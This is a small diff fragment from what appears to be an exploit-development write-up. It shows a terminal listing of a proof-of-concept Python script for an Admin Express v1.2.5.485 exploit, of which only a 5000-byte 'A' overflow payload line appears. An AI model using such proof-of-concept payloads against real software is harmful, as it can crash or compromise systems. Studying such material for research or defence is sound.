@@ -22,7 +22,7 @@ Going forward, we will be utilizing this proof of concept (PoC) Python script th
 
 ```console
 root@kali:~/ADMIN_EXPRESS/POC# cat poc.py 
-# Proof of Concept for Admin Express v1.2.5.485 Exploit
+# Proof of Concept - Admin Express v1.2.5.485 Exploit
 
 payload = "\x41" * 5000
 
